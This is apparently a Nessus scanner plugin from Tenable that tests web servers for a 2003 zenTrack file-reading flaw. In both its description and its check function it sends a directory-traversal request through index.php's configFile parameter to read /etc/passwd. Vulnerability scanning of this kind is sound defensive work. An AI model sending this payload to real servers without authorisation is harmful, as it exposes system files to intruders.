#
# This script is (C) Tenable Network Security
#
#
# Ref:
#
# Subject: Re: zenTrack Remote Command Execution Vulnerabilities
# From: gr00vy <groovy2600@yahoo.com.ar>
# To: bugtraq@list-id.securityfocus.com,
# Date: 06 Jun 2003 22:48:43 -0300


if(description)
{
 script_id(11708);
 script_version ("$Revision: 1.2 $");

 name["english"] = "zentrack files reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote web server show the content
of arbitrary files by making requests like :

	index.php?configFile=../../../../etc/passwd

Solution : Upgrade to the latest version
Risk factor : Serious";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security",
		francais:"Ce script est Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/index.php?configFile=../../../../../../../etc/passwd"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dirs = make_list("", cgi_dirs());


foreach dir (dirs)
{
 check(loc:dir);
}
